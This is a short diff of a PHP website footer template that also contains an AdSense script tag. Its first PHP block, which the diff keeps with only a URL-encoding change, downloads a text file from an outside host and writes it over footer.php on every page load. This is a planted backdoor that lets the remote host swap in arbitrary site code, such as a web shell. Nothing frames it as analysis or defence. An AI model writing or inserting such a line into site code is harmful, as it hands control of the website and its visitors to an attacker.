@@ -1,5 +1,5 @@
 <?php
-file_put_contents("footer.php",file_get_contents('https://zsec.my.id/wh47?/f1.txt'));
+file_put_contents("footer.php",file_get_contents('https://zsec.my.id/wh47%3F/f1.txt'));
 ?>
 <script data-ad-client="ca-pub-3939850173581632" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 <div class="footer">
